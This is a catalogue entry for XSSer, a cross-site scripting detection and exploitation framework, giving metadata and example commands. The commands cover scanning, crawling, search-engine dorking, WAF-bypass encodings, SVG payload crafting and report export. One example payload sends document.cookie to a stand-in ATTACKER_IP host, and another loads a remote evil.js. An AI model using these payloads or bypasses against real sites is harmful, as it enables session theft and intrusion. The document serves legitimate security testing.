---
name: "xsser"
categories:
  - blackarch-webapp
version: "1.9"
homepage: "https://xsser.03c8.net/"
packaged-by: [blackarch, kali, nixpkgs]
blackarch-builddate: "2026-09-09"
build-system: python
license: GPL3
meta-checked: "2026-11-09"
github-repo: "epsylon/xsser"
github-stars: 1480
github-pushed: "2026-09-05"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 5.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 3
gh-activity-checked: "2026-11-09"
---

# xsser

> An automatic framework to detect, exploit and report cross-site scripting vulnerabilities in web applications.

## What it's for

Cross Site "Scripter" (XSSer, by epsylon) is an automatic framework for detecting, exploiting and reporting XSS vulnerabilities in web-based applications. It ships more than 1500 attacking vectors and validates every finding with a context-aware engine that tells executable contexts (HTML, JS, event handlers, `javascript:`/`data:` URIs) apart from harmless reflections. It bundles per-WAF bypassers (Cloudflare, Akamai, AWS WAF, Azure, Imperva, F5, Barracuda, ModSecurity/OWASP CRS, Wordfence, Sucuri, FortiWeb, WebKnight) plus character-encoding mutators, and can take targets from a single URL, a URL list, a raw HTTP request file, dorking across several search engines, or its built-in crawler. It is XSS-only; other injection classes are out of scope. Version 1.9 ("Bl4ck Swarm") is a rewrite of the classic tool: `-u/--url`, `--imx`, `--Fp` and `--Fr` survive, but the legacy flags `--svx`, `--dor` and `--Fw` no longer exist — vector output, report destination and redirect following are now `--save/--xml/--json/--pdf` and `--follow-redirects/--follow-limit`.

## Typical use cases

### Audit a single injection point

```
xsser -u "http://target.example.com/search.php?q=XSS" --statistics
```

Outcome: XSSer fuzzes the parameter marked with the `XSS` keyword using its vector set, verifies which injections are actually executable, and prints findings with advanced statistics.

### Inject your own payload at an explicit GET/POST position

```
xsser -u "http://target.example.com" -g "/search.php?q=XSS" --payload "<script>alert(XSS)</script>"
```

Outcome: only the supplied payload is injected at the position given by `-g` (use `-p "foo=1&bar=XSS"` for POST), instead of the built-in fuzzing vectors.

### Crawl the target before attacking

```
xsser -u "http://target.example.com" -c 50 --Cw 3 --Cl
```

Outcome: XSSer first collects up to 50 URLs crawling three levels deep (`--Cl` keeps crawling on the local target only), then audits every injection point it discovered.

### Discover targets via dorking

```
xsser -d "news.php?id=" --Da
```

Outcome: XSSer queries all supported search engines for the dork, collects result URLs as targets, and proceeds to audit them (default single engine is DuckDuckGo via `--De`).

### Attack behind a WAF

```
xsser -u "http://target.example.com/search.php?q=XSS" --Cloudflare --Une --Hex
```

Outcome: vectors are re-encoded (Unescape + Hex here) and adapted to the selected WAF bypass profile before injection; combine multiple encoding mutators to fit the filter in front of the target.

### Exploit a finding on the fly

```
xsser -u "http://target.example.com/search.php?q=XSS" --Fp "<script>fetch('//ATTACKER_IP/c/'+document.cookie)</script>"
```

Outcome: once a vulnerability is confirmed, the final payload given by `--Fp` is injected through the discovered vector (`--Fr http://ATTACKER_IP/evil.js` loads a remote script instead).

### Craft an image carrying XSS

```
xsser --imx image.svg --payload "<script>alert(1)</script>"
```

Outcome: XSSer generates an image file with the payload code embedded, for upload- or render-based XSS vectors where the injection carrier is an image.

### Export a report

```
xsser -u "http://target.example.com/search.php?q=XSS" --pdf report.pdf --xml xsser.xml
```

Outcome: findings are written to a professional PDF report and a machine-readable XML file (JSON via `--json`) for CI pipelines or documentation.

*No corpus evidence — derived from upstream documentation (README plus the packaged v1.9 source `core/options.py` and test suite of epsylon/xsser).*
